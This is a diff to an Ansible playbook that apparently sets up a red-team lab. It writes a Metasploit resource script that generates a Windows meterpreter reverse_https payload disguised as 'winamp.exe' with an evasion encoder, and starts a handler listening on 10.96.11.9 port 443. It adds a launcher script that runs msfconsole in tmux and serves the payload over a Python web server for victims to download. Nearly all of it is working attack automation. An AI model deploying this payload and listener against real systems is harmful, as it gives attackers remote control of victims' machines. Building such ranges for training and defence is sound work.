@@ -1,3 +1,10 @@
+- name: Create folder to host payload
+  ansible.builtin.file:
+    path: /home/red/payload
+    owner: red
+    group: red
+    state: directory
+
 - name: Create Metasploit Resource Script
   copy:
     dest: "/home/red/https-handler.rc"
@@ -6,7 +13,7 @@
       set lhost 10.96.11.9
       set lport 443
       set luri /session-id
-      generate -f exe -e x64/zutto_dekiru -o /home/red/winamp.exe
+      generate -f exe -e x64/zutto_dekiru -o /home/red/payload/winamp.exe
       use exploit/multi/handler
       set payload windows/x64/meterpreter/reverse_https
       set lhost 10.96.11.9
@@ -14,25 +21,18 @@
       set luri /session-id/
       exploit -j
 
-- name: Execute Metasploit and run script
-  ansible.builtin.shell: nohup msfconsole -r /home/red/https-handler.rc &
-  async: 10
-  poll: 0
-
-- name: Retrive payload file to ansible server for staging
-  fetch:
-    src: /home/red/winamp.exe
-    dest: /tmp/winamp.exe
-    flat: yes
-
-- name: Copy file to role
+- name: Create Bash Launcher Script
   copy:
-    src: /tmp/winamp.exe
-    dest: ./ansible/roles/misc/msf-drop-payload/files/winamp.exe
-  delegate_to: 127.0.0.1
+    dest: "/home/red/launch.sh"
+    mode: 0755
+    content: |
+      #!/bin/bash
+      nohup tmux new-session -d -s msf msfconsole -r /home/red/https-handler.rc &
+      cd /home/red/payload
+      nohup python -m http.server 80 &
+      echo "action complete."
 
-- name: Clean-up file in tmp
-  file:
-    path: /tmp/winamp.exe
-    state: absent
-  delegate_to: 127.0.0.1
+- name: Execute Metasploit and run script
+  ansible.builtin.shell: cd /home/red/ && ./launch.sh
+
+
